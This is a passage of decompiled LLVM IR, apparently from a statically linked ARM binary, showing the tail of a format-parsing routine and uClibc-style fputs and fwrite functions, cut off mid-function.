  store i32 %v2_12fa8, i32* %r0.global-to-local, align 4
  store i32 %v2_12fa0, i32* %stack_var_-72, align 4
  %v0_12fcc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_12fc0

dec_label_pc_12fb4:                               ; preds = %dec_label_pc_12f30
  %v1_12fb4 = add i32 %v1_12f44, 1
  %v2_12fb4 = inttoptr i32 %v1_12fb4 to i8*
  %v3_12fb4 = load i8, i8* %v2_12fb4, align 1
  %v4_12fb4 = zext i8 %v3_12fb4 to i32
  store i32 %v4_12fb4, i32* %r3.global-to-local, align 4
  store i32 %v1_12fb4, i32* %r0.global-to-local, align 4
  %v2_12fb8 = icmp eq i8 %v3_12fb4, 0
  br i1 %v2_12fb8, label %dec_label_pc_12fc0, label %dec_label_pc_12f30

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12fb4, %dec_label_pc_12f74
  %v0_12fcc = phi i32 [ %v0_12fcc.pre, %dec_label_pc_12f74 ], [ %v0_12f14, %dec_label_pc_12fb4 ]
  %v0_12fc8 = phi i32 [ %v1_12f9c, %dec_label_pc_12f74 ], [ %v3_12f20, %dec_label_pc_12fb4 ]
  %v0_12fc0 = load i32, i32* @r4, align 4
  %v1_12fc0 = and i32 %v0_12fc0, 4
  %v1_12fc4 = and i32 %v0_12fc0, -5
  store i32 %v1_12fc4, i32* %r3.global-to-local, align 4
  %v1_12fc8 = and i32 %v0_12fc8, 3840
  store i32 %v1_12fc8, i32* %r2.global-to-local, align 4
  %v1_12fcc = inttoptr i32 %v0_12fcc to i8*
  %v2_12fcc = load i8, i8* %v1_12fcc, align 1
  %v3_12fcc = zext i8 %v2_12fcc to i32
  store i32 %v3_12fcc, i32* %r1.global-to-local, align 4
  %v2_12fd0 = or i32 %v1_12fc4, %v1_12fc8
  store i32 %v2_12fd0, i32* %r2.global-to-local, align 4
  %tmp180 = mul nuw nsw i32 %v1_12fc0, 4
  %tmp181 = or i32 %tmp180, 32
  %v1_12fdc = load i32, i32* %r7.global-to-local, align 4
  %v2_12fdc = add i32 %v1_12fdc, 20
  %v3_12fdc = inttoptr i32 %v2_12fdc to i32*
  store i32 %tmp181, i32* %v3_12fdc, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_12fe4 = load i32, i32* %r1.global-to-local, align 4
  %v1_12fe4 = load i32, i32* %r7.global-to-local, align 4
  %v2_12fe4 = add i32 %v1_12fe4, 12
  %v3_12fe4 = inttoptr i32 %v2_12fe4 to i32*
  store i32 %v0_12fe4, i32* %v3_12fe4, align 4
  %v0_12fe8 = load i32, i32* %r7.global-to-local, align 4
  %v1_12fe8 = add i32 %v0_12fe8, 4
  %v2_12fe8 = inttoptr i32 %v1_12fe8 to i32*
  %v3_12fe8 = load i32, i32* @r5, align 4
  store i32 %v3_12fe8, i32* %v2_12fe8, align 4
  %v4_12fe8 = add i32 %v0_12fe8, 8
  %v5_12fe8 = inttoptr i32 %v4_12fe8 to i32*
  %v6_12fe8 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v6_12fe8, i32* %v5_12fe8, align 4
  %v0_12fec = load i32, i32* %r2.global-to-local, align 4
  %v1_12fec = load i32, i32* %r7.global-to-local, align 4
  %v2_12fec = add i32 %v1_12fec, 16
  %v3_12fec = inttoptr i32 %v2_12fec to i32*
  store i32 %v0_12fec, i32* %v3_12fec, align 4
  %v0_12ff0 = load i32, i32* %r3.global-to-local, align 4
  %v1_12ff0 = load i32, i32* %r7.global-to-local, align 4
  %v2_12ff0 = add i32 %v1_12ff0, 28
  %v3_12ff0 = inttoptr i32 %v2_12ff0 to i32*
  store i32 %v0_12ff0, i32* %v3_12ff0, align 4
  %v0_12ff4 = load i32, i32* %r0.global-to-local, align 4
  %v1_12ff4 = inttoptr i32 %v0_12ff4 to i8*
  %v2_12ff4 = load i8, i8* %v1_12ff4, align 1
  %v3_12ff4 = zext i8 %v2_12ff4 to i32
  store i32 %v3_12ff4, i32* %r2.global-to-local, align 4
  %v2_12ff8 = icmp eq i8 %v2_12ff4, 0
  br i1 %v2_12ff8, label %dec_label_pc_13000, label %dec_label_pc_13084

dec_label_pc_13000:                               ; preds = %dec_label_pc_12fc0
  %v0_13000 = load i32, i32* %r6.global-to-local, align 4
  %v1_13000 = inttoptr i32 %v0_13000 to i8*
  %v2_13000 = load i8, i8* %v1_13000, align 1
  %v3_13000 = zext i8 %v2_13000 to i32
  store i32 %v3_13000, i32* %r3.global-to-local, align 4
  %v7_13004 = icmp eq i8 %v2_13000, 109
  br i1 %v7_13004, label %.thread28, label %dec_label_pc_13018

.thread28:                                        ; preds = %dec_label_pc_13000
  store i32 20, i32* %r3.global-to-local, align 4
  %v2_1300c = load i32, i32* %r7.global-to-local, align 4
  %v3_1300c = add i32 %v2_1300c, 32
  %v4_1300c = inttoptr i32 %v3_1300c to i32*
  store i32 20, i32* %v4_1300c, align 4
  %v1_13010 = load i32, i32* %r2.global-to-local, align 4
  %v2_13010 = load i32, i32* %r7.global-to-local, align 4
  %v3_13010 = add i32 %v2_13010, 28
  %v4_13010 = inttoptr i32 %v3_13010 to i32*
  store i32 %v1_13010, i32* %v4_13010, align 4
  br label %dec_label_pc_13084

dec_label_pc_13018:                               ; preds = %dec_label_pc_13000
  store i32 728, i32* %r3.global-to-local, align 4
  %v0_1301c = load i32, i32* @lr, align 4
  %v2_1301c = add i32 %v0_1301c, 728
  %v3_1301c = inttoptr i32 %v2_1301c to i32*
  %v4_1301c = load i32, i32* %v3_1301c, align 4
  store i32 %v4_1301c, i32* %r1.global-to-local, align 4
  store i32 21, i32* %r3.global-to-local, align 4
  %v1_13024 = load i32, i32* %r7.global-to-local, align 4
  %v2_13024 = add i32 %v1_13024, 32
  %v3_13024 = inttoptr i32 %v2_13024 to i32*
  store i32 21, i32* %v3_13024, align 4
  %v0_13028 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_13028, i32* @ip, align 4
  %v1_1302c = add i32 %v0_13028, 10
  store i32 %v1_1302c, i32* %r0.global-to-local, align 4
  %v0_13034.pre = load i32, i32* %r6.global-to-local, align 4
  %v1_13034 = inttoptr i32 %v0_13034.pre to i8*
  br label %dec_label_pc_13030

dec_label_pc_13030:                               ; preds = %dec_label_pc_13074, %dec_label_pc_13018
  %v1_13040 = phi i32 [ %v1_13074, %dec_label_pc_13074 ], [ %v0_13028, %dec_label_pc_13018 ]
  %v1_13030 = inttoptr i32 %v1_13040 to i8*
  %v2_13030 = load i8, i8* %v1_13030, align 1
  %v3_13030 = zext i8 %v2_13030 to i32
  store i32 %v3_13030, i32* %r2.global-to-local, align 4
  %v2_13034 = load i8, i8* %v1_13034, align 1
  %v3_13034 = zext i8 %v2_13034 to i32
  store i32 %v3_13034, i32* %r3.global-to-local, align 4
  %v9_13038 = icmp eq i8 %v2_13030, %v2_13034
  br i1 %v9_13038, label %dec_label_pc_13040, label %dec_label_pc_13074

dec_label_pc_13040:                               ; preds = %dec_label_pc_13030
  %v2_13040 = sub i32 %v1_13040, %v0_13028
  store i32 %v2_13040, i32* %r3.global-to-local, align 4
  %v0_13048 = load i32, i32* %r7.global-to-local, align 4
  %v1_13048 = add i32 %v0_13048, 4
  store i32 %v1_13048, i32* %r0.global-to-local, align 4
  %v0_1304c = load i32, i32* @lr, align 4
  %v2_1304c = add i32 %v0_1304c, 10488
  store i32 5, i32* %r1.global-to-local, align 4
  %v2_13054 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_13054, i32* %r2.global-to-local, align 4
  %v4_13058 = mul i32 %v2_13040, 4
  %v5_13058 = add i32 %v2_1304c, %v4_13058
  %v6_13058 = inttoptr i32 %v5_13058 to i32*
  %v7_13058 = load i32, i32* %v6_13058, align 4
  store i32 %v7_13058, i32* @ip, align 4
  store i32 77924, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v7_13058)
  %v0_13064 = load i32, i32* %r0.global-to-local, align 4
  %v1_13068 = load i32, i32* %r7.global-to-local, align 4
  %v2_13068 = add i32 %v1_13068, 28
  %v3_13068 = inttoptr i32 %v2_13068 to i32*
  store i32 %v0_13064, i32* %v3_13068, align 4
  %v7_1306c = icmp sgt i32 %v0_13064, 5
  br i1 %v7_1306c, label %dec_label_pc_13180, label %dec_label_pc_13084

dec_label_pc_13074:                               ; preds = %dec_label_pc_13030
  %v1_13074 = add i32 %v1_13040, 1
  store i32 %v1_13074, i32* %r1.global-to-local, align 4
  %v3_13078 = icmp ult i32 %v1_13074, %v1_1302c
  br i1 %v3_13078, label %dec_label_pc_13030, label %dec_label_pc_13180

dec_label_pc_13084:                               ; preds = %.thread28, %dec_label_pc_13040, %dec_label_pc_12fc0
  %v0_13084 = load i32, i32* %fp.global-to-local, align 4
  %tmp156 = icmp slt i32 %v0_13084, 1
  br i1 %tmp156, label %dec_label_pc_13130, label %dec_label_pc_1308c

dec_label_pc_1308c:                               ; preds = %dec_label_pc_13084
  store i32 0, i32* %r8.global-to-local, align 4
  %v9_130a4 = add i32 %stack_var_-44.3, -2
  br label %dec_label_pc_13090

dec_label_pc_13090:                               ; preds = %dec_label_pc_13118, %dec_label_pc_1308c
  %v9_130b0 = phi i32 [ 0, %dec_label_pc_1308c ], [ %v1_1311c, %dec_label_pc_13118 ]
  %v7_13094 = icmp sgt i32 %v9_130b0, 2
  br i1 %v7_13094, label %.thread38, label %bb157

.thread38:                                        ; preds = %dec_label_pc_13090
  store i32 %v9_130a4, i32* %r3.global-to-local, align 4
  %v10_130b0 = add i32 %v9_130b0, %v9_130a4
  store i32 %v10_130b0, i32* %r1.global-to-local, align 4
  br label %bb158

bb157:                                            ; preds = %dec_label_pc_13090
  store i32 %v3_12d0c.pre-phi, i32* @ip, align 4
  %v12_13098 = mul i32 %v9_130b0, 4
  %v13_13098 = add i32 %v12_13098, %v3_12d0c.pre-phi
  store i32 %v13_13098, i32* %r3.global-to-local, align 4
  %v9_130a0 = add i32 %v13_13098, -12
  %v10_130a0 = inttoptr i32 %v9_130a0 to i8*
  %v11_130a0 = load i8, i8* %v10_130a0, align 4
  %v12_130a0 = zext i8 %v11_130a0 to i32
  store i32 %v12_130a0, i32* %r2.global-to-local, align 4
  %v9_130a8 = load i32, i32* %r7.global-to-local, align 4
  %v10_130a8 = add i32 %v9_130a8, %v9_130b0
  store i32 %v10_130a8, i32* %r3.global-to-local, align 4
  store i32 %v12_130a0, i32* %r1.global-to-local, align 4
  %v11_130b4 = add i32 %v10_130a8, 36
  %v12_130b4 = inttoptr i32 %v11_130b4 to i8*
  store i8 %v11_130a0, i8* %v12_130b4, align 1
  %v0_130b8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %.thread38, %bb157
  %v0_130d8 = phi i32 [ %v10_130b0, %.thread38 ], [ %v0_130b8.pre, %bb157 ]
  %v1_130b8 = load i32, i32* %fp.global-to-local, align 4
  %v2_130b8 = sub i32 %v0_130d8, %v1_130b8
  %v4_130b8 = xor i32 %v1_130b8, %v0_130d8
  %v5_130b8 = xor i32 %v2_130b8, %v0_130d8
  %v6_130b8 = and i32 %v5_130b8, %v4_130b8
  %v7_130b8 = icmp slt i32 %v6_130b8, 0
  %v8_130b8 = icmp slt i32 %v2_130b8, 0
  %v9_130b8 = icmp eq i32 %v0_130d8, %v1_130b8
  %v3_130bc = xor i1 %v8_130b8, %v7_130b8
  %v4_130bc = or i1 %v9_130b8, %v3_130bc
  br i1 %v4_130bc, label %dec_label_pc_130cc, label %dec_label_pc_130c0

dec_label_pc_130c0:                               ; preds = %bb158
  %v1_130c0 = add i32 %v0_130d8, -9
  %v3_130c0 = sub i32 8, %v0_130d8
  %v4_130c0 = and i32 %v3_130c0, %v0_130d8
  %v5_130c0 = icmp slt i32 %v4_130c0, 0
  %v6_130c0 = icmp slt i32 %v1_130c0, 0
  %v7_130c0 = icmp eq i32 %v0_130d8, 9
  %v3_130c4 = xor i1 %v6_130c0, %v5_130c0
  %v4_130c4 = or i1 %v7_130c0, %v3_130c4
  br i1 %v4_130c4, label %dec_label_pc_130c8, label %dec_label_pc_13180

dec_label_pc_130c8:                               ; preds = %dec_label_pc_130c0
  store i32 %v0_130d8, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_130cc

dec_label_pc_130cc:                               ; preds = %bb158, %dec_label_pc_130c8
  store i32 %v3_12d0c.pre-phi, i32* @r2, align 4
  %v1_130d0 = load i32, i32* %r8.global-to-local, align 4
  %v4_130d0 = mul i32 %v1_130d0, 4
  %v5_130d0 = add i32 %v4_130d0, %v3_12d0c.pre-phi
  store i32 %v5_130d0, i32* %sb.global-to-local, align 4
  %v1_130d4 = add i32 %v5_130d0, -40
  %v2_130d4 = inttoptr i32 %v1_130d4 to i32*
  %v3_130d4 = load i32, i32* %v2_130d4, align 4
  store i32 %v3_130d4, i32* %r5.global-to-local, align 4
  %v1_130d8 = add i32 %v0_130d8, -1
  store i32 %v1_130d8, i32* %r3.global-to-local, align 4
  %v0_130dc = load i32, i32* %r7.global-to-local, align 4
  %v4_130dc = mul i32 %v1_130d8, 4
  %v5_130dc = add i32 %v0_130dc, %v4_130dc
  store i32 %v5_130dc, i32* %sl.global-to-local, align 4
  %v7_130e0 = icmp eq i32 %v3_130d4, 8
  %v1_130e4 = add i32 %v5_130dc, 40
  %v2_130e4 = inttoptr i32 %v1_130e4 to i32*
  %v3_130e4 = load i32, i32* %v2_130e4, align 4
  store i32 %v3_130e4, i32* @r0, align 4
  br i1 %v7_130e0, label %dec_label_pc_13118, label %dec_label_pc_130ec

dec_label_pc_130ec:                               ; preds = %dec_label_pc_130cc
  %v9_130ec = icmp eq i32 %v3_130e4, %v3_130d4
  br i1 %v9_130ec, label %dec_label_pc_13110, label %bb159

bb159:                                            ; preds = %dec_label_pc_130ec
  %v8_130f0 = icmp eq i32 %v3_130e4, 8
  br i1 %v8_130f0, label %dec_label_pc_13110, label %dec_label_pc_130f8

dec_label_pc_130f8:                               ; preds = %bb159
  %v0_130f8 = call i32 @_promoted_size()
  %v0_13100 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_13100, i32* @r0, align 4
  %v0_13104 = call i32 @_promoted_size()
  store i32 %v0_13104, i32* %r0.global-to-local, align 4
  %v8_1310c = icmp sgt i32 %v0_130f8, %v0_13104
  br i1 %v8_1310c, label %dec_label_pc_13118, label %dec_label_pc_130f8.dec_label_pc_13110_crit_edge

dec_label_pc_130f8.dec_label_pc_13110_crit_edge:  ; preds = %dec_label_pc_130f8
  %v0_13110.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_13114.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_13110

dec_label_pc_13110:                               ; preds = %dec_label_pc_130f8.dec_label_pc_13110_crit_edge, %dec_label_pc_130ec, %bb159
  %v1_13114 = phi i32 [ %v1_13114.pre, %dec_label_pc_130f8.dec_label_pc_13110_crit_edge ], [ %v5_130dc, %dec_label_pc_130ec ], [ %v5_130dc, %bb159 ]
  %v0_13110 = phi i32 [ %v0_13110.pre, %dec_label_pc_130f8.dec_label_pc_13110_crit_edge ], [ %v5_130d0, %dec_label_pc_130ec ], [ %v5_130d0, %bb159 ]
  %v1_13110 = add i32 %v0_13110, -40
  %v2_13110 = inttoptr i32 %v1_13110 to i32*
  %v3_13110 = load i32, i32* %v2_13110, align 4
  store i32 %v3_13110, i32* %r3.global-to-local, align 4
  %v2_13114 = add i32 %v1_13114, 40
  %v3_13114 = inttoptr i32 %v2_13114 to i32*
  store i32 %v3_13110, i32* %v3_13114, align 4
  br label %dec_label_pc_13118

dec_label_pc_13118:                               ; preds = %dec_label_pc_130f8, %dec_label_pc_130cc, %dec_label_pc_13110
  %v0_13118 = load i32, i32* %r7.global-to-local, align 4
  %v1_13118 = add i32 %v0_13118, 28
  %v2_13118 = inttoptr i32 %v1_13118 to i32*
  %v3_13118 = load i32, i32* %v2_13118, align 4
  %v0_1311c = load i32, i32* %r8.global-to-local, align 4
  %v1_1311c = add i32 %v0_1311c, 1
  store i32 %v1_1311c, i32* %r8.global-to-local, align 4
  %v1_13120 = add i32 %v3_13118, 2
  store i32 %v1_13120, i32* %r3.global-to-local, align 4
  %v6_13128 = icmp slt i32 %v1_1311c, %v1_13120
  br i1 %v6_13128, label %dec_label_pc_13090, label %dec_label_pc_1314c

dec_label_pc_13130:                               ; preds = %dec_label_pc_13084
  %v0_13130 = load i32, i32* %r7.global-to-local, align 4
  %v1_13130 = add i32 %v0_13130, 28
  %v2_13130 = inttoptr i32 %v1_13130 to i32*
  %v3_13130 = load i32, i32* %v2_13130, align 4
  store i32 %v3_13130, i32* %r2.global-to-local, align 4
  store i32 1, i32* @r3, align 4
  %v3_13138 = add i32 %v0_13130, 38
  %v4_13138 = inttoptr i32 %v3_13138 to i8*
  store i8 1, i8* %v4_13138, align 1
  %v0_1313c = load i32, i32* %r2.global-to-local, align 4
  %v3_1313c = mul i32 %v0_1313c, 4
  store i32 %v3_1313c, i32* @r2, align 4
  %v0_13140 = load i32, i32* %r7.global-to-local, align 4
  %v1_13140 = add i32 %v0_13140, 40
  store i32 %v1_13140, i32* @r0, align 4
  %v2_13144 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_13144, i32* @r1, align 4
  %v0_13148 = call i32 @memcpy()
  store i32 %v0_13148, i32* %r0.global-to-local, align 4
  %v0_1314c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1314c

dec_label_pc_1314c:                               ; preds = %dec_label_pc_13118, %dec_label_pc_13130
  %v2_13168 = phi i32 [ %v0_1314c.pre, %dec_label_pc_13130 ], [ %v0_13118, %dec_label_pc_13118 ]
  %v1_1314c = add i32 %v2_13168, 16
  %v2_1314c = inttoptr i32 %v1_1314c to i32*
  %v3_1314c = load i32, i32* %v2_1314c, align 4
  store i32 %v3_1314c, i32* %r3.global-to-local, align 4
  %v1_13150 = and i32 %v3_1314c, 128
  %v2_13150 = icmp eq i32 %v1_13150, 0
  br i1 %v2_13150, label %.thread50, label %.thread48

.thread48:                                        ; preds = %dec_label_pc_1314c
  %v3_13154 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v3_13154, i32* %r3.global-to-local, align 4
  %v2_13158 = inttoptr i32 %v2_13168 to i32*
  %v3_13158 = load i32, i32* %v2_13158, align 4
  %v2_13160.pre = load i32, i32* %r6.global-to-local, align 4
  %v3_13160 = sub i32 %v2_13160.pre, %v3_13154
  store i32 %v3_13160, i32* %r3.global-to-local, align 4
  %v5_13164 = mul i32 %v3_13160, 4
  %v6_13164 = add i32 %v5_13164, %v3_13158
  store i32 %v6_13164, i32* @r2, align 4
  br label %bb160

.thread50:                                        ; preds = %dec_label_pc_1314c
  %v1_1315c45 = load i32, i32* %r6.global-to-local, align 4
  %v2_1315c46 = add i32 %v1_1315c45, 1
  store i32 %v2_1315c46, i32* %r3.global-to-local, align 4
  %v3_13168 = inttoptr i32 %v2_13168 to i32*
  store i32 %v2_1315c46, i32* %v3_13168, align 4
  %v0_1316c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %bb160

bb160:                                            ; preds = %.thread48, %.thread50
  %v1_13174 = phi i32 [ %v2_13168, %.thread48 ], [ %v0_1316c.pre, %.thread50 ]
  %v1_1316c = add i32 %v1_13174, 28
  %v2_1316c = inttoptr i32 %v1_1316c to i32*
  %v3_1316c = load i32, i32* %v2_1316c, align 4
  store i32 %v3_1316c, i32* %r3.global-to-local, align 4
  %v1_13170 = add i32 %v3_1316c, 2
  store i32 %v1_13170, i32* %r0.global-to-local, align 4
  %v0_13174 = load i32, i32* %fp.global-to-local, align 4
  %v2_13174 = add i32 %v1_13174, 24
  %v3_13174 = inttoptr i32 %v2_13174 to i32*
  store i32 %v0_13174, i32* %v3_13174, align 4
  br i1 %v2_13150, label %dec_label_pc_13184, label %bb161

bb161:                                            ; preds = %bb160
  %v1_13178 = load i32, i32* @r2, align 4
  %v2_13178 = load i32, i32* %r7.global-to-local, align 4
  %v3_13178 = inttoptr i32 %v2_13178 to i32*
  store i32 %v1_13178, i32* %v3_13178, align 4
  br label %dec_label_pc_13184

dec_label_pc_13180:                               ; preds = %dec_label_pc_13074, %dec_label_pc_12c94, %dec_label_pc_12ddc, %dec_label_pc_12e88, %dec_label_pc_12e60, %dec_label_pc_12e6c, %dec_label_pc_12da8, %dec_label_pc_130c0, %dec_label_pc_13040, %.thread24
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13184

dec_label_pc_13184:                               ; preds = %bb161, %bb160, %dec_label_pc_13180
  %v2_13188 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_13188, i32* @r4, align 4
  store i32 %v6_12c50, i32* @r5, align 4
  store i32 %v27_12c50, i32* @lr, align 4
  %v1_1318c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1318c

; uselistorder directives
  uselistorder i32 %v3_13160, { 1, 0 }
  uselistorder i32 %v1_1311c, { 1, 2, 0 }
  uselistorder i32 %v2_130b8, { 1, 0 }
  uselistorder i32 %v1_130b8, { 1, 0, 2 }
  uselistorder i32 %v0_130d8, { 3, 4, 5, 0, 7, 6, 9, 1, 2, 8 }
  uselistorder i32 %v9_130b0, { 0, 2, 1, 3 }
  uselistorder i32 %v1_13074, { 1, 2, 0 }
  uselistorder i32 %v0_13064, { 1, 0 }
  uselistorder i32 %v1_13040, { 1, 0, 2 }
  uselistorder i32 %v1_12fb4, { 1, 2, 0 }
  uselistorder i32 %v1_12f9c, { 1, 0 }
  uselistorder i32 %v2_12f84, { 2, 1, 0 }
  uselistorder i32 %v1_12f68, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12f60, { 3, 4, 2, 0, 1 }
  uselistorder i32 %v1_12f44, { 1, 0, 2 }
  uselistorder i32 %v2_12f2c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12f20, { 2, 1, 0 }
  uselistorder i32 %v1_12ee0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12ed0.pre, { 0, 2, 1 }
  uselistorder i32 %v2_12eac, { 1, 0 }
  uselistorder i32 %v5_12e0c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12e0c, { 1, 0 }
  uselistorder i32 %v0_12e1076, { 1, 2, 3, 0, 4 }
  uselistorder i32 %stack_var_-44.2, { 1, 0 }
  uselistorder i32 %v2_12db4, { 1, 0 }
  uselistorder i32 %v0_12dd4, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_12d98, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_12d80, { 2, 3, 4, 5, 0, 1, 6 }
  uselistorder i32 %v2_12d70, { 1, 0 }
  uselistorder i32 %v3_12d68, { 0, 2, 1 }
  uselistorder i8 %v2_12d68, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12de8, { 1, 2, 3, 0, 4, 6, 5 }
  uselistorder i32 %v0_12d2c, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %stack_var_-44.1, { 1, 2, 3, 0 }
  uselistorder i32 %v1_12d18, { 1, 2, 0, 3 }
  uselistorder i32 %v0_12d00, { 1, 0 }
  uselistorder i32 %v3_12d0c.pre-phi, { 0, 4, 1, 5, 2, 3 }
  uselistorder i32 %v1_12cb4, { 0, 2, 1 }
  uselistorder i32 %v2_12ca0, { 1, 0, 2 }
  uselistorder i32 %v0_12c54, { 0, 1, 3, 2, 4 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 2, 0 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 1, 0, 3, 7, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32* %r6.global-to-local, { 15, 9, 11, 12, 10, 0, 1, 14, 2, 13, 3, 4, 5, 6, 8, 16, 7 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 60, 51, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 38, 37, 39, 40, 41, 42, 43, 44, 45, 17, 46, 49, 50, 47, 48, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19, 20 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 16, 26, 27, 25, 17, 28, 18, 19, 20, 29, 21, 30, 31, 22, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 4, 5, 6, 7, 8, 9, 11, 10, 12, 13, 14, 15, 17, 18, 19, 22, 16, 20, 21, 24, 25, 23, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 4, 0, 5, 6, 7, 1, 2, 3, 8, 9 }
  uselistorder i32 ()* @_promoted_size, { 1, 0 }
  uselistorder i32 728, { 1, 2, 0 }
  uselistorder i32 -5, { 2, 1, 0 }
  uselistorder i32 -37052, { 0, 2, 1, 3 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1, 6 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i8 36, { 1, 0 }
  uselistorder i8 37, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 2147483647, { 3, 4, 1, 6, 0, 2, 5 }
  uselistorder i32 140, { 2, 1, 4, 0, 5, 6, 7, 3 }
  uselistorder i32 -72, { 1, 0 }
  uselistorder label %dec_label_pc_13184, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13180, { 7, 0, 8, 9, 3, 5, 4, 2, 6, 1 }
  uselistorder label %bb160, { 1, 0 }
  uselistorder label %dec_label_pc_1314c, { 1, 0 }
  uselistorder label %dec_label_pc_13118, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13110, { 0, 2, 1 }
  uselistorder label %dec_label_pc_130cc, { 1, 0 }
  uselistorder label %bb158, { 1, 0 }
  uselistorder label %dec_label_pc_13084, { 1, 0, 2 }
  uselistorder label %bb152, { 2, 1, 0 }
  uselistorder label %.thread24, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12e98, { 1, 0 }
  uselistorder label %dec_label_pc_12e4c, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_12dc8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12dc4, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_12d64, { 1, 0 }
  uselistorder label %dec_label_pc_12d60, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12d64.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_12d04, { 1, 0 }
  uselistorder label %dec_label_pc_12cd8, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_131c0 = load i32, i32* @r4, align 4
  store i32 %v3_131c0, i32* %stack_var_-16, align 4
  %v6_131c0 = load i32, i32* @r5, align 4
  %v9_131c0 = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_131cc = call i32 @strlen(i8* %arg1)
  store i32 %v3_131cc, i32* @r6, align 4
  %v0_131d4 = load i32, i32* @r5, align 4
  %v0_131d8 = load i32, i32* @r4, align 4
  %v5_131e4 = inttoptr i32 %v0_131d4 to i16*
  %v6_131e4 = call i32 @__GI_fwrite_unlocked(i32 %v0_131d8, i32 1, i32 %v3_131cc, i16* %v5_131e4)
  %v1_131e8 = load i32, i32* @r6, align 4
  %v9_131e8 = icmp eq i32 %v6_131e4, %v1_131e8
  br i1 %v9_131e8, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v1_131f4 = phi i32 [ %v6_131e4, %entry ], [ -1, %bb ]
  %v2_131f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_131f0, i32* @r4, align 4
  store i32 %v6_131c0, i32* @r5, align 4
  store i32 %v9_131c0, i32* @r6, align 4
  ret i32 %v1_131f4

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i16* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg4 to i32
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_131f8 = load i32, i32* @r6, align 4
  %v12_131f8 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_13200 = load i16, i16* %arg4, align 2
  %v1_13204 = and i16 %v3_13200, 192
  %v2_13208 = icmp eq i16 %v1_13204, 192
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r4, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_13208, label %dec_label_pc_13234, label %dec_label_pc_13220

dec_label_pc_13220:                               ; preds = %entry
  %v4_13228 = call i32 @__stdio_trans2w_o(i16* nonnull %arg4, i32 128)
  %v2_1322c = icmp eq i32 %v4_13228, 0
  br i1 %v2_1322c, label %dec_label_pc_13234thread-pre-split, label %dec_label_pc_13294

dec_label_pc_13234thread-pre-split:               ; preds = %dec_label_pc_13220
  %v0_13234.pr = load i32, i32* @r4, align 4
  br label %dec_label_pc_13234

dec_label_pc_13234:                               ; preds = %dec_label_pc_13234thread-pre-split, %entry
